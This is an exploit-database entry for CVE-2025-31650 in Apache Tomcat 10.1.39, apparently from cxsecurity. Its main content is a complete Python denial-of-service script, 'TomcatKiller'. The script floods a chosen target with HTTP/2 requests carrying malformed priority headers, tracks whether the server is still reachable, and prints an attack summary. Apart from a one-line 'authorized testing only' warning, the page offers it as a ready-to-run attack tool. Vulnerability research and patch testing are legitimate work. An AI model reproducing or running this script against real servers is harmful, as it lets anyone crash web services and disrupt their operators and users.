---
title: Apache Tomcat/10.1.39 DoS-BOF
url: https://cxsecurity.com/issue/WLB-2025060012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-13
fetch_date: 2025-10-06T22:51:24.731646
---

# Apache Tomcat/10.1.39 DoS-BOF

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache Tomcat/10.1.39 DoS-BOF** **2025.06.12**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-31650](https://cxsecurity.com/cveshow/CVE-2025-31650/ "Click to see CVE-2025-31650")**  CWE: **N/A** | |

# Titles: Apache Tomcat/10.1.39 DoS-BOF
# Author: nu11secur1ty
# Date: 06/11/2025
# Vendor: https://tomcat.apache.org/
# Software: https://tomcat.apache.org/download-10.cgi
# Reference: https://owasp.org/www-community/vulnerabilities/Buffer\_Overflow > https://portswigger.net/web-security/dom-based/denial-of-service
## Description:
Apache Tomcat Version 10.1.39, Mar 4 2025, is Vulnerable to Buffer Overflow DoS attacks.
The attacker can send malicious header requests using the HTTP/2 protocol and crash the web server every time they want.
This will be very nasty and brutal.
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
```Python
# AT-10.1.39
import httpx
import asyncio
import random
import urllib.parse
import sys
import socket
from colorama import init, Fore, Style
init()
class TomcatKiller:
def \_\_init\_\_(self):
self.success\_count = 0
self.error\_count = 0
self.invalid\_priorities = [
"u=-1, q=2",
"u=4294967295, q=-1",
"u=-2147483648, q=1.5",
"u=0, q=invalid",
"u=1/0, q=NaN",
"u=1, q=2, invalid=param",
"",
"u=1, q=1, u=2",
"u=99999999999999999999, q=0",
"u=-99999999999999999999, q=0",
"u=, q=",
"u=1, q=1, malformed",
"u=1, q=, invalid",
"u=-1, q=4294967295",
"u=invalid, q=1",
"u=1, q=1, extra=@",
"u=1, q=1; malformed",
"u=1, q=1, =invalid",
"u=0, q=0, stream=invalid",
"u=1, q=1, priority=recursive",
"u=1, q=1, %invalid%",
"u=0, q=0, null=0",
]
async def validate\_url(self, url):
try:
parsed\_url = urllib.parse.urlparse(url)
if not parsed\_url.scheme or not parsed\_url.hostname:
raise ValueError("Invalid URL format. Use http:// or https://")
host = parsed\_url.hostname
port = parsed\_url.port if parsed\_url.port else (443 if parsed\_url.scheme == 'https' else 80)
return host, port
except Exception:
print(f"{Fore.RED}Error: Invalid URL. Use http:// or https:// format.{Style.RESET\_ALL}")
sys.exit(1)
async def check\_http2\_support(self, host, port):
async with httpx.AsyncClient(http2=True, verify=False, timeout=5, limits=httpx.Limits(max\_connections=1000)) as client:
try:
response = await client.get(f"https://{host}:{port}/", headers={"user-agent": "TomcatKiller"})
if response.http\_version == "HTTP/2":
print(f"{Fore.GREEN}HTTP/2 supported! Proceeding ...{Style.RESET\_ALL}")
return True
else:
print(f"{Fore.YELLOW}Error: HTTP/2 not supported. This exploit requires HTTP/2.{Style.RESET\_ALL}")
return False
except Exception:
print(f"{Fore.RED}Error: Could not connect to {host}:{port}.{Style.RESET\_ALL}")
return False
async def send\_invalid\_priority\_request(self, host, port, num\_requests, task\_id):
async with httpx.AsyncClient(http2=True, verify=False, timeout=0.3, limits=httpx.Limits(max\_connections=1000)) as client:
url = f"https://{host}:{port}/"
for i in range(num\_requests):
headers = {
"priority": random.choice(self.invalid\_priorities),
"user-agent": f"TomcatKiller-{task\_id}-{random.randint(1, 1000000)}",
"cache-control": "no-cache",
"accept": f"\*/\*; q={random.random()}",
}
try:
await client.get(url, headers=headers)
self.success\_count += 1
except Exception:
self.error\_count += 1
async def monitor\_server(self, host, port):
while True:
try:
with socket.create\_connection((host, port), timeout=2):
print(f"{Fore.YELLOW}Target {host}:{port} is reachable.{Style.RESET\_ALL}")
except Exception:
print(f"{Fore.RED}Target {host}:{port} unreachable or crashed!{Style.RESET\_ALL}")
break
await asyncio.sleep(2)
async def run\_attack(self, host, port, num\_tasks, requests\_per\_task):
print(f"{Fore.GREEN}Starting attack on {host}:{port}...{Style.RESET\_ALL}")
print(f"Tasks: {num\_tasks}, Requests per task: {requests\_per\_task}")
print(f"{Fore.YELLOW}Monitor memory manually via VisualVM or check catalina.out for OutOfMemoryError.{Style.RESET\_ALL}")
monitor\_task = asyncio.create\_task(self.monitor\_server(host, port))
tasks = [self.send\_invalid\_priority\_request(host, port, requests\_per\_task, i) for i in range(num\_tasks)]
await asyncio.gather(\*tasks)
monitor\_task.cancel()
total\_requests = num\_tasks \* requests\_per\_task
success\_rate = (self.success\_count / total\_requests \* 100) if total\_requests > 0 else 0
print(f"\n{Fore.MAGENTA}===== Attack Summary ====={Style.RESET\_ALL}")
print(f"Target: {host}:{port}")
print(f"Total Requests: {total\_requests}")
print(f"Successful Requests: {self.success\_count}")
print(f"Failed Requests: {self.error\_count}")
print(f"Success Rate: {success\_rate:.2f}%")
print(f"{Fore.MAGENTA}========================={Style.RESET\_ALL}")
async def main():
print(f"{Fore.BLUE}===== TomcatKiller - CVE-2025-31650 ====={Style.RESET\_ALL}")
print(f"Debugged by: @nu11secur1ty")
print(f"Exploits memory leak in Apache Tomcat (10.1.39) via invalid HTTP/2 priority headers.")
print(f"{Fore.YELLOW}Warning: For authorized testing only. Ensure HTTP/2 and vulnerable Tomcat version.{Style.RESET\_ALL}\n")
url = input(f"{Fore.CYAN}Enter target URL (e.g., https://localhost:8443): {Style.RESET\_ALL}")
num\_tasks = int(input(f"{Fore.CYAN}Enter number of tasks (default 300): {Style.RESET\_ALL}") or 300)
requests\_per\_task = int(input(f"{Fore.CYAN}Enter requests per task (default 100000): {Style.RESET\_ALL}") or 100000)
tk = TomcatKiller()
host, port = await tk.validate\_url(url)
if not await tk.check\_http2\_support(host, port):
sys.exit(1)
await tk.run\_attack(host, port, num\_tasks, requests\_per\_task)
if \_\_name\_\_ == "\_\_main\_\_":
try:
asyncio.run(main())
print(f"{Fore.GREEN}Attack completed!{Style.RESET\_ALL}")
except KeyboardInterrupt:
print(f"{Fore.YELLOW}Attack interrupted by user.{Style.RESET\_ALL}")
sys.exit(0)
except Exception as e:
print(f"{Fore.RED}Unexpected error: {e}{Style.RESET\_ALL}")
sys.exit(1)
```
# Reproduce:
[href](https://www.youtube.com/...